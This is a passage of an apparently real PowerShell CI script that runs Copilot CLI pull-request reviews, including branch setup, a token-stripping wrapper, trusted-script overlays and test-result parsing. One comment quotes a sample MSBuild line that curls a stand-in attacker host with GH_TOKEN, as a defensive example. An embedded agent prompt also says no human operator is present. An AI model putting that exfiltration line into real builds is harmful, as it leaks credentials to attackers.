<#
.SYNOPSIS
    Runs a PR review using Copilot CLI with skill-based prompts.

.DESCRIPTION
    Orchestrates a PR review by invoking scripts and Copilot CLI:
    
    Step 1: Branch setup           - Create review branch from main, merge PR squashed
    Step 2: Detect UI categories   - Run eng/scripts/detect-ui-test-categories.ps1 (info only)
    Step 3: Regression cross-ref   - Run Find-RegressionRisks.ps1 + run any tests from prior fix PRs
    Step 4: Gate                   - Run test verification directly (verify-tests-fail.ps1)
    Step 5: Multi-candidate review - Pre-Flight, then PARALLEL (expert-reviewer eval of PR + Try-Fix×4),
                                     then Report compares all candidates and writes winner.json
    Step 6: Post AI Summary        - Directly runs posting scripts
    Step 7: Apply labels           - Apply agent labels based on review results

    NOTE: Full-category UI test runs happen in the RunDeepUITests stage (ci-copilot.yml Stage 2),
    not here. This script only runs targeted PR-specific tests in the Gate (Step 4).

    By default, the script checks out main and creates a review branch from it.
    If squash-merge conflicts, the script posts a comment on the PR and exits.
    Use -UseCurrentBranch to create the review branch from the current branch instead.

.PARAMETER PRNumber
    The GitHub PR number to review

.PARAMETER Platform
    Platform for testing. Valid: android, ios, windows, maccatalyst

.PARAMETER UseCurrentBranch
    Create the review branch from the current branch instead of main.
    By default, the script checks out main before creating the review branch.

.PARAMETER DryRun
    Show what would be done without making changes

.PARAMETER LogFile
    Capture all output via Start-Transcript

.PARAMETER TokenUsageOutputDir
    Directory where Copilot CLI token-usage telemetry records should be written.

.EXAMPLE
    .\Review-PR.ps1 -PRNumber 33687
    .\Review-PR.ps1 -PRNumber 33687 -Platform ios
    .\Review-PR.ps1 -PRNumber 33687 -UseCurrentBranch
#>

[CmdletBinding()]
param(
    [Parameter(Mandatory = $true, Position = 0)]
    [int]$PRNumber,

    [Parameter(Mandatory = $false)]
    [ValidateSet('android', 'ios', 'windows', 'maccatalyst', 'catalyst')]
    [string]$Platform,

    [Parameter(Mandatory = $false)]
    [ValidateSet('Setup', 'Gate', 'CopilotReview', 'Post')]
    [string]$Phase,

    [Parameter(Mandatory = $false)]
    [string]$TrustedScriptsDir,

    [Parameter(Mandatory = $false)]
    [switch]$UseCurrentBranch,

    [Parameter(Mandatory = $false)]
    [switch]$DryRun,

    [Parameter(Mandatory = $false)]
    [string]$LogFile,

    [Parameter(Mandatory = $false)]
    [string]$TokenUsageOutputDir,

    # Trusted gate verdict supplied by the pipeline Gate task (output variable), captured
    # before the untrusted CopilotReview phase runs. Passed to post-ai-summary-comment.ps1 so
    # the APPROVE veto never trusts the agent-writable gate-result.txt in the worktree/artifact.
    [Parameter(Mandatory = $false)]
    [ValidateSet('PASSED', 'SKIPPED', 'INCONCLUSIVE', 'FAILED', '')]
    [string]$TrustedGateResult = ''
)

$ErrorActionPreference = 'Stop'

if ($LogFile) {
    # When running with -Phase, each phase is a separate process writing to the same log.
    # Append a phase suffix so phases don't overwrite each other's logs.
    if ($Phase) {
        $logExt = [System.IO.Path]::GetExtension($LogFile)
        $logBase = $LogFile.Substring(0, $LogFile.Length - $logExt.Length)
        $LogFile = "${logBase}_${Phase}${logExt}"
    }
    $logDir = Split-Path $LogFile -Parent
    if ($logDir -and -not (Test-Path $logDir)) {
        New-Item -ItemType Directory -Path $logDir -Force | Out-Null
    }
    Start-Transcript -Path $LogFile -Force | Out-Null
}

$RepoRoot = git rev-parse --show-toplevel 2>$null
if (-not $RepoRoot) { Write-Error "Not in a git repository"; exit 1 }

# ─── Phase routing ─────────────────────────────────────────────────────────────
# When -Phase is specified, run ONLY that phase. This enables the 4-task AzDO
# split where each task calls Review-PR.ps1 with a different phase, each with
# exactly the secrets it needs in its env: block.
#
# Task 1 (Setup):         env: GH_TOKEN.             No dotnet, no copilot.
# Task 2 (Gate):          env: GH_TOKEN.  PR-code subprocesses (dotnet test,
#                         BuildAndRunHostApp.ps1, etc.) are wrapped via
#                         Invoke-WithoutGhTokens so they cannot exfiltrate the token.
# Task 3 (CopilotReview): env: COPILOT_GITHUB_TOKEN. copilot → dotnet (stripped).
# Task 4 (Post):          env: GH_TOKEN.             Trusted scripts, no dotnet.
#
# When -Phase is NOT specified, all steps run sequentially (backward compat for
# local development use).
$runSetup         = -not $Phase -or $Phase -eq 'Setup'
$runGate          = -not $Phase -or $Phase -eq 'Gate'
$runCopilotReview = -not $Phase -or $Phase -eq 'CopilotReview'
$runPost          = -not $Phase -or $Phase -eq 'Post'

# Resolve the scripts directory — use TrustedScriptsDir if provided (CI),
# otherwise use the repo's own .github/ directory (local dev).
$ScriptsDir    = if ($TrustedScriptsDir) { Join-Path $TrustedScriptsDir 'scripts' }     else { $PSScriptRoot }
$SkillsDir     = if ($TrustedScriptsDir) { Join-Path $TrustedScriptsDir 'skills' }      else { Join-Path $PSScriptRoot '../skills' }
$EngScriptsDir = if ($TrustedScriptsDir) { Join-Path $TrustedScriptsDir 'eng-scripts' } else { Join-Path $PSScriptRoot '../../eng/scripts' }

$commentCleanupScript = Join-Path $ScriptsDir "shared/Remove-StaleMauiBotComments.ps1"
if (Test-Path $commentCleanupScript) {
    . $commentCleanupScript
}

# Gate has GH_TOKEN in env so trusted code (Detect-TestsInDiff, Find-RegressionRisks,
# detect-ui-test-categories) can fetch PR metadata via `gh` CLI. Any subprocess that
# executes PR-controlled code (MSBuild targets, test code, source generators, host-app
# builds) would otherwise inherit that token and trivially exfiltrate it via something
# like `<Exec Command="curl attacker/?t=$(GH_TOKEN)" />` in a .csproj or
# Directory.Build.targets. Wrap every such invocation in Invoke-WithoutGhTokens.
function Invoke-WithoutGhTokens {
    [CmdletBinding()]
    param([Parameter(Mandatory)][scriptblock]$ScriptBlock)
    $saved = @{
        GH_TOKEN             = $env:GH_TOKEN
        GITHUB_TOKEN         = $env:GITHUB_TOKEN
        COPILOT_GITHUB_TOKEN = $env:COPILOT_GITHUB_TOKEN
    }
    try {
        $env:GH_TOKEN             = $null
        $env:GITHUB_TOKEN         = $null
        $env:COPILOT_GITHUB_TOKEN = $null
        & $ScriptBlock
    } finally {
        foreach ($k in $saved.Keys) { Set-Item -Path ("env:" + $k) -Value $saved[$k] }
    }
}

# ─── Banner ───────────────────────────────────────────────────────────────────
Write-Host ""
Write-Host "╔═══════════════════════════════════════════════════════════╗" -ForegroundColor Cyan
Write-Host "║           PR Review with Copilot CLI                      ║" -ForegroundColor Cyan
Write-Host "╠═══════════════════════════════════════════════════════════╣" -ForegroundColor Cyan
Write-Host "║  PR:        #$PRNumber                                          ║" -ForegroundColor Cyan
if ($Platform) {
    Write-Host "║  Platform:  $Platform                                        ║" -ForegroundColor Cyan
} else {
    Write-Host "║  Platform:  (agent will determine)                        ║" -ForegroundColor Cyan
}
Write-Host "╚═══════════════════════════════════════════════════════════╝" -ForegroundColor Cyan
Write-Host ""

# ─── Shared variables (available to all phases) ──────────────────────────────
$platformInstruction = if ($Platform) {
    "**Platform for testing:** $Platform"
} else {
    "**Platform for testing:** Determine from PR's affected code paths and current host OS."
}

$autonomousRules = @"

🚨 **AUTONOMOUS EXECUTION:**
- There is NO human operator - NEVER stop and ask for input
- On environment blockers: skip the blocked phase and continue
- Always prefer CONTINUING with partial results over STOPPING
"@

$reviewBranch = "pr-review-$PRNumber"

if ([string]::IsNullOrWhiteSpace($TokenUsageOutputDir)) {
    $TokenUsageOutputDir = Join-Path $RepoRoot "CustomAgentLogsTmp/PRState/$PRNumber/PRAgent/token-usage/raw"
}

# ─── Prerequisites ────────────────────────────────────────────────────────────
if ($runSetup) {
Write-Host "📋 Checking prerequisites..." -ForegroundColor Yellow

$ghVersion = gh --version 2>$null | Select-Object -First 1
if (-not $ghVersion) { Write-Error "GitHub CLI (gh) not installed"; exit 1 }
Write-Host "  ✅ GitHub CLI: $ghVersion" -ForegroundColor Green

$copilotCmd = Get-Command copilot -ErrorAction SilentlyContinue
if (-not $copilotCmd) { Write-Error "Copilot CLI not installed"; exit 1 }
$copilotVersion = (& copilot --version 2>&1 | Out-String).Trim()
if (-not $copilotVersion) { $copilotVersion = $copilotCmd.Source }
Write-Host "  ✅ Copilot CLI: $copilotVersion" -ForegroundColor Green

$prInfo = gh pr view $PRNumber --json title,state,body 2>$null | ConvertFrom-Json
if (-not $prInfo) { Write-Error "PR #$PRNumber not found"; exit 1 }
Write-Host "  ✅ PR: $($prInfo.title)" -ForegroundColor Green

# ═════════════════════════════════════════════════════════════════════════════
#  STEP 1: Branch Setup (Create Review Branch & Cherry-Pick PR)
# ═════════════════════════════════════════════════════════════════════════════

Write-Host ""
Write-Host "╔═══════════════════════════════════════════════════════════╗" -ForegroundColor Yellow
Write-Host "║  STEP 1: BRANCH SETUP                                     ║" -ForegroundColor Yellow
Write-Host "╚═══════════════════════════════════════════════════════════╝" -ForegroundColor Yellow

if ($DryRun) {
    if ($UseCurrentBranch) {
        Write-Host "[DRY RUN] Would create review branch '$reviewBranch' from current branch" -ForegroundColor Magenta
    } else {
        Write-Host "[DRY RUN] Would checkout main, then create review branch '$reviewBranch'" -ForegroundColor Magenta
    }
    Write-Host "[DRY RUN] Would squash-merge PR #$PRNumber (stops on conflicts)" -ForegroundColor Magenta
} else {
    # In CI pipelines, prior steps (Build MSBuild Tasks, Install Appium) may leave
    # modified tracked files (e.g. HybridWebView.js) or untracked dirs (e.g. .appium/).
    # Clean them so the dirty-tree check doesn't fail on build artifacts.
    if ($env:TF_BUILD) {
        git checkout -- . 2>$null
        git clean -fd -e CustomAgentLogsTmp/ 2>$null
    }

    # Check for dirty working tree
    $dirtyFiles = git status --porcelain 2>$null
    if ($dirtyFiles) {
        Write-Error "Working tree is dirty. Please commit or stash changes before running review.`n$dirtyFiles"
        exit 1
    }

    # Delete leftover review branch from a previous run (if it exists)
    $existingBranch = git branch --list $reviewBranch 2>$null
    if ($existingBranch) {
        Write-Host "  ⚠️ Removing leftover branch '$reviewBranch' from previous run" -ForegroundColor Yellow
        git branch -D $reviewBranch 2>$null
    }

    # Auto-detect CI environment
    $isCI = $env:CI -or $env:TF_BUILD -or $env:GITHUB_ACTIONS -or $env:BUILD_BUILDID

    # Capture original branch so error paths can restore it (not `git checkout -` which is unreliable)
    $originalBranch = git branch --show-current 2>$null
    if (-not $originalBranch) { $originalBranch = git rev-parse HEAD 2>$null }

    if ($UseCurrentBranch) {
        $currentBranch = git branch --show-current 2>$null
        if (-not $currentBranch) { $currentBranch = "(detached HEAD)" }
        Write-Host "  📌 Using current branch: $currentBranch" -ForegroundColor Cyan
    } elseif ($isCI) {
        # In CI the checkout is pinned to the pipeline branch (e.g.
        # feature/regression-check via -b parameter). The pipeline ref
        # already contains our script fixes — switching to origin/main
        # would overwrite them. Stay on the current branch and squash-merge
        # the PR onto it. This preserves all pipeline-ref scripts while
        # still testing the PR's changes.
        $currentBranch = git branch --show-current 2>$null
        if (-not $currentBranch) { $currentBranch = git rev-parse --short HEAD 2>$null }
        $baseSha = git rev-parse --short HEAD 2>$null
        Write-Host "  🤖 CI environment detected — using pipeline branch '$currentBranch' as merge base ($baseSha)" -ForegroundColor Cyan
    } else {
        # Default (local): checkout main
        Write-Host "  📌 Checking out main branch..." -ForegroundColor Cyan
        git checkout main 2>&1 | Out-Null
        if ($LASTEXITCODE -ne 0) { Write-Error "Failed to checkout main"; exit 1 }
        $pullOutput = git pull origin main --ff-only 2>&1
        if ($LASTEXITCODE -ne 0) {
            Write-Host "  ⚠️ git pull failed (non-fatal, continuing with local main): $pullOutput" -ForegroundColor Yellow
        }
        $baseSha = git rev-parse --short HEAD 2>$null
        Write-Host "  📌 Review base: main @ $baseSha" -ForegroundColor Cyan
    }

    # Create review branch
    Write-Host "  🔀 Creating review branch: $reviewBranch" -ForegroundColor Cyan
    git checkout -b $reviewBranch 2>&1 | Out-Null
    if ($LASTEXITCODE -ne 0) { Write-Error "Failed to create branch '$reviewBranch'"; exit 1 }

    # Fetch PR commits
    Write-Host "  📥 Fetching PR #$PRNumber..." -ForegroundColor Cyan
    $tempBranch = "temp-pr-$PRNumber"

    # Clean up any leftover temp branch
    git branch -D $tempBranch 2>$null | Out-Null

    # Try fetching from origin (same-repo PRs)
    git fetch origin "pull/$PRNumber/head:$tempBranch" 2>&1 | Out-Null
    if ($LASTEXITCODE -ne 0) {
        # Fork PR — get fork info
        Write-Host "  📥 Fetching from fork..." -ForegroundColor Cyan
        $forkInfo = gh pr view $PRNumber --json headRepositoryOwner,headRefName,headRepository 2>$null | ConvertFrom-Json
        if (-not $forkInfo -or -not $forkInfo.headRepositoryOwner) {
            Write-Error "Failed to fetch PR #$PRNumber (not found on origin or fork)"
            git checkout $originalBranch 2>$null
            exit 1
        }
        $forkUrl = "https://github.com/$($forkInfo.headRepositoryOwner.login)/$($forkInfo.headRepository.name).git"
        $fetchOutput = git fetch $forkUrl "$($forkInfo.headRefName):$tempBranch" 2>&1
        if ($LASTEXITCODE -ne 0) {
            Write-Error "Failed to fetch from fork: $forkUrl`n$fetchOutput"
            git checkout $originalBranch 2>$null
            exit 1
        }
    }

    # ── Merge PR commits (squash) ──
    Write-Host "  🔀 Merging PR commits (squashed)..." -ForegroundColor Cyan
    git merge --squash $tempBranch 2>&1 | Out-Null
    if ($LASTEXITCODE -eq 0) {
        # Ensure both staged and unstaged merge output is committed. Some
        # squash merges can leave tracked files modified in the worktree rather
        # than only staged; Gate later requires fix files to be committed so it
        # can restore them with `git checkout HEAD`.
        git add -A 2>&1 | Out-Null
        if ($LASTEXITCODE -ne 0) {
            git branch -D $tempBranch 2>$null
            Write-Error "Failed to stage squashed PR changes"; exit 1
        }

        # Check if there's anything to commit (PR might already be merged)
        $staged = git diff --cached --quiet 2>$null; $hasStagedChanges = $LASTEXITCODE -ne 0
        if ($hasStagedChanges) {
            git commit -m "PR #$PRNumber squashed for review" 2>&1 | Out-Null
            if ($LASTEXITCODE -ne 0) {
                git branch -D $tempBranch 2>$null
                Write-Error "Failed to create squashed commit"; exit 1
            }
            Write-Host "  ✅ Squash-merge succeeded" -ForegroundColor Green
        } else {
            Write-Host "  ⚠️ No changes to merge (PR may already be up to date)" -ForegroundColor Yellow
        }

        git diff --quiet 2>$null; $hasWorktreeChanges = $LASTEXITCODE -ne 0
        git diff --cached --quiet 2>$null; $hasIndexChanges = $LASTEXITCODE -ne 0
        if ($hasWorktreeChanges -or $hasIndexChanges) {
            Write-Error "Review branch has uncommitted tracked changes after setup. Gate cannot proceed safely."
            git status --short
            exit 1
        }

        if (Get-Command Remove-StaleMauiBotIssueComments -ErrorAction SilentlyContinue) {
            Remove-StaleMauiBotIssueComments `
                -PRNumber $PRNumber `
                -IncludeMergeConflict `
                -Reason "resolved merge-conflict notice"
        }
    } else {
        Write-Host "  ❌ Squash-merge had conflicts." -ForegroundColor Red
        git merge --abort 2>$null
        git reset --hard HEAD 2>$null

        # Clean up branches
        git checkout $originalBranch 2>$null
        git branch -D $reviewBranch 2>$null
        git branch -D $tempBranch 2>$null

        if (Get-Command Remove-StaleMauiBotIssueComments -ErrorAction SilentlyContinue) {
            Remove-StaleMauiBotIssueComments `
                -PRNumber $PRNumber `
                -IncludeMergeConflict `
                -Reason "stale merge-conflict notice"
        }

        # Post a comment on the PR about merge conflicts
        $conflictBody = @"
<!-- MAUI_BOT_MERGE_CONFLICT -->
⚠️ **Merge Conflict Detected** — This PR has merge conflicts with its target branch. Please rebase onto the target branch and resolve the conflicts.
"@
        try {
            gh pr comment $PRNumber --body $conflictBody 2>&1 | Out-Null
            Write-Host "  📝 Posted merge conflict comment on PR" -ForegroundColor Cyan
        } catch {
            Write-Host "  ⚠️ Could not post merge conflict comment (non-fatal): $_" -ForegroundColor Yellow
        }

        Write-Error "Merge conflicts for PR #$PRNumber. Review cannot proceed until conflicts are resolved."
        exit 1
    }

    # Clean up temp branch
    git branch -D $tempBranch 2>$null | Out-Null

    # Verify
    $headCommit = git log --oneline -1 2>$null
    Write-Host "  ✅ Review branch ready: $reviewBranch" -ForegroundColor Green
    Write-Host "  📝 HEAD: $headCommit" -ForegroundColor Gray
}

} # end if ($runSetup)

# End of Setup phase — write sentinel and exit early
if ($Phase -eq 'Setup') {
    # Sentinel signals to Tasks 2-4 that Setup completed successfully (PR merged).
    $sentinelDir = if ($TrustedScriptsDir) {
        Split-Path $TrustedScriptsDir -Parent
    } else {
        $d = Join-Path $RepoRoot "CustomAgentLogsTmp/PRState/$PRNumber/PRAgent/gate"
        New-Item -ItemType Directory -Force -Path $d | Out-Null
        $d
    }
    "OK" | Set-Content (Join-Path $sentinelDir "setup-complete") -Encoding UTF8
    # Persist PR metadata so the CopilotReview phase can evaluate the existing title/
    # description for the pr-finalize (Phase 4) step. `gh pr view` is unreliable in the
    # CopilotReview phase after the squash-merge checkout, and $prInfo is only populated
    # here in Setup, so we hand the values across phases via this file (same shared-dir
    # mechanism as the setup-complete sentinel).
    if ($prInfo) {
        try {
            ([ordered]@{ title = [string]$prInfo.title; body = [string]$prInfo.body } | ConvertTo-Json -Depth 4) |
                Set-Content (Join-Path $sentinelDir "pr-metadata.json") -Encoding UTF8
        } catch { Write-Host "  ⚠️ Could not persist pr-metadata.json: $($_.Exception.Message)" -ForegroundColor Yellow }
    }
    Write-Host "✅ Setup phase complete" -ForegroundColor Green
    if ($LogFile) { Stop-Transcript -ErrorAction SilentlyContinue | Out-Null }
    exit 0
}

# Overlay the trusted, branch-aware infra scripts over the worktree. The gate's
# verify-tests-fail.ps1 (and try-fix candidate validation) invoke the WORKTREE's
# Run-DeviceTests.ps1 / BuildAndRunHostApp.ps1 — they resolve their own RepoRoot from .git, so
# they must physically live in the worktree. Without this overlay they would be the PR branch's
# possibly-stale copies: e.g. a net11 PR whose branch still hardcodes net10.0-android would build
# the wrong TFM and fail NETSDK1005. Mirrors the deep-UI-test stage's "Restore trusted scripts"
# step and enforces security rule 3 (no PR-controlled infra .ps1 runs with tokens in scope).
# MUST be re-applied after every `git reset --hard`, which would otherwise revert it. The src/
# tree stays base + PR. No-op outside CI (when -TrustedScriptsDir is not supplied).
function Restore-TrustedScripts {
    param([string]$TrustedScriptsDir, [string]$RepoRoot)
    if (-not $TrustedScriptsDir) { return }
    $overlayMap = @(
        @{ Src = (Join-Path $TrustedScriptsDir 'scripts');     Dest = (Join-Path $RepoRoot '.github/scripts') },
        @{ Src = (Join-Path $TrustedScriptsDir 'skills');      Dest = (Join-Path $RepoRoot '.github/skills') },
        @{ Src = (Join-Path $TrustedScriptsDir 'eng-scripts'); Dest = (Join-Path $RepoRoot 'eng/scripts') }
    )
    $restored = $false
    foreach ($o in $overlayMap) {
        if (Test-Path $o.Src) {
            Remove-Item -Recurse -Force $o.Dest -ErrorAction SilentlyContinue
            Copy-Item -Recurse -Force $o.Src $o.Dest
            $restored = $true
        }
    }
    if ($restored) {
        Write-Host "  🔒 Restored trusted .github/scripts, .github/skills, eng/scripts over the worktree (branch-aware + trusted infra)" -ForegroundColor Cyan
    }
}

# ─── Sentinel check: verify Setup completed before running later phases ───
if ($Phase -and $Phase -ne 'Setup') {
    $sentinelDir = if ($TrustedScriptsDir) {
        Split-Path $TrustedScriptsDir -Parent
    } else {
        Join-Path $RepoRoot "CustomAgentLogsTmp/PRState/$PRNumber/PRAgent/gate"
    }
    $sentinelFile = Join-Path $sentinelDir "setup-complete"
    if (-not (Test-Path $sentinelFile)) {
        Write-Error "Setup phase did not complete (sentinel not found at '$sentinelFile'). Cannot proceed with -Phase $Phase."
        exit 1
    }

    if (-not $DryRun) {
        git checkout $reviewBranch 2>$null | Out-Null
        if ($LASTEXITCODE -ne 0) {
            Write-Error "Failed to checkout review branch '$reviewBranch' before -Phase $Phase."
            exit 1
        }
        git reset --hard HEAD 2>$null | Out-Null
        if ($LASTEXITCODE -ne 0) {
            Write-Error "Failed to reset review branch '$reviewBranch' before -Phase $Phase."
            exit 1
        }

        # Re-apply trusted infra scripts over the just-reset worktree (see Restore-TrustedScripts).
        Restore-TrustedScripts -TrustedScriptsDir $TrustedScriptsDir -RepoRoot $RepoRoot
    }
}

# ─── Helper: Parse `dotnet test --logger "console;verbosity=detailed"` ──────
# Extracts per-test results (Passed/Failed/Skipped) plus failure messages and
# stack traces from raw stdout. Used by the RunDeepUITests stage and Gate so the
# AI summary review shows WHICH tests failed and WHY, not just an aggregate exit code.
function Get-DotNetTestResults {
    param([string[]]$Lines)

    $results = New-Object System.Collections.ArrayList
    if (-not $Lines -or $Lines.Count -eq 0) { return ,@() }
    $n = $Lines.Count
    $i = 0
    # A test result line: "  Passed/Failed/Skipped <name> [<duration>]"
    $testRe = '^  (Passed|Failed|Skipped)\s+(.+?)\s+\[(.+?)\]\s*$'
    while ($i -lt $n) {
        $line = [string]$Lines[$i]
        if ($line -match $testRe) {
            $status   = $Matches[1]
            $name     = $Matches[2].Trim()
            $duration = $Matches[3].Trim()

            $err   = New-Object System.Collections.Generic.List[string]
            $stack = New-Object System.Collections.Generic.List[string]
            $section = $null
            $j = $i + 1
            while ($j -lt $n) {
                $l = [string]$Lines[$j]
                # Stop at the next test result.
                if ($l -match $testRe) { break }
                # Stop at runner / xharness section markers.
                $stripped = $l.Trim()
                if ($stripped.StartsWith('>>>>>') -or
                    $stripped.StartsWith('NUnit Adapter') -or
                    $stripped.StartsWith('Test Run') -or
                    $stripped.StartsWith('Total tests:') -or
                    $stripped.StartsWith('Total time:') -or
                    $stripped.StartsWith('Test execution complete') -or
                    $stripped.StartsWith('Passed!') -or
                    $stripped.StartsWith('Failed!') -or
                    $stripped.StartsWith('Skipped!') -or
                    $stripped -match '^\[xUnit') {
                    break
                }
                if ($stripped.StartsWith('Error Message:')) {
                    $section = 'err'
                    $rest = $stripped.Substring('Error Message:'.Length).Trim()
                    if ($rest) { $err.Add($rest) | Out-Null }
                } elseif ($stripped.StartsWith('Stack Trace:')) {
                    $section = 'stack'
                    $rest = $stripped.Substring('Stack Trace:'.Length).Trim()
                    if ($rest) { $stack.Add($rest) | Out-Null }
                } elseif ($stripped.StartsWith('Standard Output Messages:') -or
                          $stripped.StartsWith('Attachments:')) {
                    $section = 'stdout'
                } elseif ($section -eq 'err') {
                    $err.Add($l.TrimEnd()) | Out-Null
                } elseif ($section -eq 'stack') {
                    $stack.Add($l.TrimEnd()) | Out-Null
                }
                $j++
            }

            $entry = [ordered]@{
                status   = $status
                name     = $name
                duration = $duration
                error    = (($err   -join "`n").Trim())
                stack    = (($stack -join "`n").Trim())
            }
            [void]$results.Add($entry)
            $i = [Math]::Max($j, $i + 1)
        } else {
            $i++
        }
    }
    # Force array semantics so callers see [object[]] even with 0 or 1 items.
    return ,@($results.ToArray())
}

# ─── Helper: Parse VSTest TRX file (authoritative test results) ─────────────
# CI's `RunTestWithLocalDotNet` writes a TRX file via:
#   --logger "trx;LogFileName=<sanitized>.trx" --results-directory <dir>
# The TRX is the same format AzDO's PublishTestResults@2 ingests, so it has
# every test's outcome, duration, error message and stack trace — without
# any console-scrape ambiguity. The RunDeepUITests stage and Gate prefer TRX when
# parsing console output is fragile when many tests run, lines wrap, or
# multi-line ErrorRecords get glued together by PowerShell stream merging.
# Get-TrxResults: defined inline because Review-PR.ps1 is invoked by
# Copilot CLI in a way that breaks dot-sourcing ($PSScriptRoot empty).
# The canonical copy lives in shared/Get-TrxResults.ps1 for Stage 3.
function Get-TrxResults {
    param([string]$TrxPath)

    if (-not $TrxPath -or -not (Test-Path $TrxPath)) {
        return $null
    }

    try {
        [xml]$trx = Get-Content -Path $TrxPath -Raw -Encoding UTF8
    } catch {
        Write-Host "    ⚠️ Failed to parse TRX $TrxPath : $_" -ForegroundColor Yellow
        return $null
    }

    $ns = New-Object System.Xml.XmlNamespaceManager($trx.NameTable)
    $ns.AddNamespace('t', 'http://microsoft.com/schemas/VisualStudio/TeamTest/2010')

    $countersNode = $trx.SelectSingleNode('//t:ResultSummary/t:Counters', $ns)
    $total = 0; $passed = 0; $failed = 0; $skipped = 0
    if ($countersNode) {
        $total   = [int]($countersNode.GetAttribute('total'))
        $passed  = [int]($countersNode.GetAttribute('passed'))
        $failed  = [int]($countersNode.GetAttribute('failed'))
        $executed = [int]($countersNode.GetAttribute('executed'))
        $skipped  = [Math]::Max(0, $total - $executed)
    }

    $entries = New-Object System.Collections.ArrayList
    $resultNodes = $trx.SelectNodes('//t:UnitTestResult', $ns)
    foreach ($r in $resultNodes) {
        $name = $r.GetAttribute('testName')
        $outcomeAttr = $r.GetAttribute('outcome')
        $status = switch ($outcomeAttr) {
            'Passed'       { 'Passed' }
            'Failed'       { 'Failed' }
            'NotExecuted'  { 'Skipped' }
            'Inconclusive' { 'Skipped' }
            # Map all other outcomes (Aborted, Timeout, Error, Disconnected,
            # Warning, Pending) to Failed — matches shared/Get-TrxResults.ps1.
            default        { 'Failed' }
        }
        $duration = $r.GetAttribute('duration')
        $err = ''; $stack = ''
        $errInfo = $r.SelectSingleNode('t:Output/t:ErrorInfo', $ns)
        if ($errInfo) {
            $msgNode   = $errInfo.SelectSingleNode('t:Message', $ns)
            $stackNode = $errInfo.SelectSingleNode('t:StackTrace', $ns)
            if ($msgNode)   { $err   = $msgNode.InnerText.Trim() }
            if ($stackNode) { $stack = $stackNode.InnerText.Trim() }
        }
        [void]$entries.Add([ordered]@{
            status   = $status
            name     = $name
            duration = $duration
            error    = $err
            stack    = $stack
        })
    }

    return @{
        Total   = $total
        Passed  = $passed
        Failed  = $failed
        Skipped = $skipped
        Results = @($entries.ToArray())
        TrxPath = $TrxPath
    }
}

# ─── Helper: Copilot token usage telemetry ────────────────────────────────────
function ConvertTo-AzdoSafeConsole {
    param([string]$Text)
    # Collapse ALL line-break/control chars (CR/LF/FF/VT) to a space so PR-influenceable streamed
    # agent output can't fabricate a fresh column-0 line, then defang AzDO logging-command prefixes
    # (##vso[ / ##[). Applied to every Write-Host of streamed content (messages, intents, tool args).
    return ($Text -replace '[\r\n\f\v]+', ' ') -replace '##(?=\[|vso\[)', '## '
}

function Test-IsNumericValue {
    param([object]$Value)

    return (
        $Value -is [byte] -or
        $Value -is [sbyte] -or
        $Value -is [int16] -or
        $Value -is [uint16] -or
        $Value -is [int] -or
        $Value -is [uint32] -or
        $Value -is [long] -or
        $Value -is [uint64] -or
        $Value -is [float] -or
        $Value -is [double] -or
        $Value -is [decimal]
    )
}

function Get-ObjectMemberValue {
    param(
        [object]$InputObject,
        [string[]]$Names
    )

    if ($null -eq $InputObject) { return $null }

    foreach ($name in $Names) {
        if ($InputObject -is [System.Collections.IDictionary] -and $InputObject.Contains($name)) {
            return $InputObject[$name]
        }

        $property = $InputObject.PSObject.Properties[$name]
        if ($property) {
            return $property.Value
        }
    }

    return $null
}

function Get-CopilotUsageTokenFields {
    param(
        [object]$Value,
        [string]$Path = ''
    )

    $fields = New-Object System.Collections.ArrayList
    if ($null -eq $Value) { return @() }

    if (Test-IsNumericValue $Value) {
        if ($Path -match '(?i)token') {
            [void]$fields.Add([ordered]@{
                Path  = $Path
                Value = [double]$Value
            })
        }
        return @($fields.ToArray())
    }

    if ($Value -is [string]) { return @() }

    if ($Value -is [System.Collections.IDictionary]) {
        foreach ($key in $Value.Keys) {
            $childPath = if ($Path) { "$Path.$key" } else { [string]$key }
            foreach ($field in Get-CopilotUsageTokenFields -Value $Value[$key] -Path $childPath) {
                [void]$fields.Add($field)
            }
        }
        return @($fields.ToArray())
    }

    if ($Value -is [System.Collections.IEnumerable]) {
        $index = 0
        foreach ($item in $Value) {
            $childPath = if ($Path) { "$Path[$index]" } else { "[$index]" }
            foreach ($field in Get-CopilotUsageTokenFields -Value $item -Path $childPath) {
                [void]$fields.Add($field)
            }
            $index++
        }
        return @($fields.ToArray())
    }

    foreach ($property in $Value.PSObject.Properties) {
        if ($property.MemberType -notin @('NoteProperty', 'Property', 'AliasProperty')) {
            continue
        }

        $childPath = if ($Path) { "$Path.$($property.Name)" } else { $property.Name }
        foreach ($field in Get-CopilotUsageTokenFields -Value $property.Value -Path $childPath) {
            [void]$fields.Add($field)
        }
    }

    return @($fields.ToArray())
}

function Get-TokenFieldSum {
    param([object[]]$Fields)

    $items = @($Fields | Where-Object { $null -ne $_ })
    if ($items.Count -eq 0) { return $null }

    $sum = 0.0
    foreach ($item in $items) {
        $sum += [double]$item.Value
    }

    return [long][Math]::Round($sum)
}

function Get-TokenFieldPathDepth {
    param([string]$Path)
    # Nesting depth = number of '.'/'[' segment separators in the dotted/indexed path.
    return ([regex]::Matches([string]$Path, '[.\[]')).Count
}

function Select-CanonicalTokenFields {
    param([object[]]$Fields)

    # Prevent double-counting when a payload carries BOTH a root aggregate and a nested
    # per-model breakdown for the same unit (e.g. inputTokens=1000 plus perModel[*].inputTokens
    # = 600+400). Prefer the shallowest matches; only fall through to the deeper breakdown when
    # no shallower aggregate exists. Flat payloads (a single depth) are unaffected.
    $items = @($Fields)
    if ($items.Count -le 1) { return $items }
    $minDepth = ($items | ForEach-Object { Get-TokenFieldPathDepth $_.Path } | Measure-Object -Minimum).Minimum
    return @($items | Where-Object { (Get-TokenFieldPathDepth $_.Path) -eq $minDepth })
}

function Get-CopilotTokenMetrics {
    param([object]$Usage)

    $tokenFields = @(Get-CopilotUsageTokenFields -Value $Usage)
    $inputFields = @($tokenFields | Where-Object {
        $_.Path -match '(?i)(input|prompt)' -and
        $_.Path -notmatch '(?i)(cache|cached)' -and
        $_.Path -notmatch '(?i)total'
    })
    $outputFields = @($tokenFields | Where-Object {
        $_.Path -match '(?i)(output|completion)' -and
        $_.Path -notmatch '(?i)(cache|cached)' -and
        $_.Path -notmatch '(?i)total'
    })
    $cachedInputFields = @($tokenFields | Where-Object {
        $_.Path -match '(?i)(cache|cached)' -and
        $_.Path -match '(?i)(input|prompt|read)'
    })
    $explicitTotalFields = @($tokenFields | Where-Object {
        $_.Path -match '(?i)total' -and
        $_.Path -match '(?i)token'
    })

